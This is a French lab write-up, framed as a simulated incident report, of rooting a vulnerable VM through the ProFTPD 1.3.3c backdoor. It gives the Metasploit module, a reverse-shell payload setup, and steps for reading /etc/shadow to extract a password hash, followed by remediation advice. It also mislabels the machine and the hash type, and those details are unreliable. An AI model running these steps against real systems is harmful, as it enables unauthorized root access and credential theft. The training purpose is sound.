# Rapport d'incident simulé - Machine "Kioptrix Level 1"

## Résumé exécutif

Ce projet consiste en l'exploitation d'une machine virtuelle vulnérable (Basic Pentesting 1) dans un environnement de laboratoire isolé. L'objectif était de simuler un test d'intrusion complet : reconnaissance, exploitation, post-exploitation et documentation. La machine cible a été compromise via une backdoor dans le service **ProFTPD 1.3.3c**, permettant un accès **root** immédiat. La phase de post-exploitation a révélé des informations sensibles, notamment un hash de mot de passe pour l'utilisateur `marlinspike` présent dans `/etc/shadow`.

La configuration du réseau Host-Only a permis une communication isolée entre la machine attaquante (Parrot OS) et la cible. Ce projet démontre l'importance de la mise à jour des services exposés et de la surveillance des logs.
Il s'agit d'une machine vulnerable fictive tout l'exercice a été fait sur un environnement fictif.

---

## Chronologie des événements

| Heure | Événement |
|-------|-----------|
| 14:00 | Création d'un réseau Host-Only dans VirtualBox (adaptateur). Attribution automatique des IP via DHCP. |
| 14:05 | Vérification de l'IP de Parrot OS : `192.168.56.101`. |
| 14:10 | Démarrage de la machine "Basic Pentesting 1". Récupération automatique d'une IP (DHCP). |
| 14:15 | Découverte de la cible avec `netdiscover -r 192.168.56.0/24`. IP identifiée : `192.168.56.102`. |
| 14:20 | Scan de ports avec `nmap -sV -sC -A 192.168.56.102`. Détection du service **ProFTPD 1.3.3c** sur le port 21, identifié comme vulnérable à une backdoor. |
| 14:30 | Lancement de Metasploit (`msfconsole`). Chargement de l'exploit `exploit/unix/ftp/proftpd_133c_backdoor` avec le payload `cmd/unix/reverse`. |
| 14:32 | Configuration des paramètres : `set RHOSTS 192.168.56.102` et `set LHOST 192.168.56.101`. |
| 14:35 | Exécution de l'exploit (`run`). Obtention d'un shell root (`uid=0(root)`). |
| 14:40 | Exploration du système. Commande `ls -la /root`. Présence d'un fichier `.bash_history`. |
| 14:45 | Lecture de `.bash_history` de l'utilisateur `marlinspike` (`cat /home/marlinspike/.bash_history`). Découverte des commandes : `cat /etc/passwd` et `cat /etc/shadow`. |
| 14:50 | Extraction du hash de `marlinspike` depuis `/etc/shadow`. |


---

## Indicateurs de compromission (IOC)

| Type | Valeur observée |
|------|----------------|
| IP source | `192.168.56.101` (Parrot OS) |
| IP cible | `192.168.56.102` (Kioptrix Level 1) |
| Service exposé | ProFTPD 1.3.3c (port 21/TCP) |
| Exploit utilisé | `exploit/unix/ftp/proftpd_133c_backdoor` (Metasploit) |
| Payload | `cmd/unix/reverse` |
| Accès obtenu | `uid=0(root)` |
| Fichier sensible découvert | `/home/marlinspike/.bash_history` contenant `cat /etc/shadow` |
| Hash extrait | `marlinspike:$6wQb5nv3T$xB2wo' (hash MD5 depuis `/etc/shadow`) |

---

## Impact

- **Systèmes impactés** : Une seule machine cible, isolée dans un laboratoire (pas d'impact sur le réseau de production).
- **Données** : Aucune donnée réelle n'a été compromise. Cependant, des informations sensibles (hash de mot de passe) ont été extraites, démontrant une configuration faible.
- **Gravité estimée** : **Critique** – L'accès root immédiat permet une prise de contrôle totale du système, une installation de portes dérobées et une exfiltration de données potentielles.

---

## Remédiation et recommandations

- **Action immédiate** : La machine cible a été isolée sur le réseau Host-Only pour éviter toute propagation (dans un contexte réel, elle serait mise hors ligne ou en quarantaine).

- **Recommandation 1** : **Mettre à jour ou désactiver ProFTPD**. La version 1.3.3c est connue pour contenir une backdoor. Passer à une version patchée ou remplacer le service par une alternative plus sécurisée (ex: vsftpd).

- **Recommandation 2** : **Renforcer les mots de passe**. Le hash de `marlinspike` extrait indique que le mot de passe est probablement faible. Appliquer une politique de mots de passe complexes (12 caractères, majuscules, minuscules, chiffres, spéciaux) et forcer le changement régulier.

- **Recommandation 3** : **Activer un pare-feu (UFW)**. Limiter l'accès aux services exposés. Exemple :
  ```bash
  sudo ufw allow from 192.168.56.0/24 to any port 22 proto tcp
  sudo ufw enable
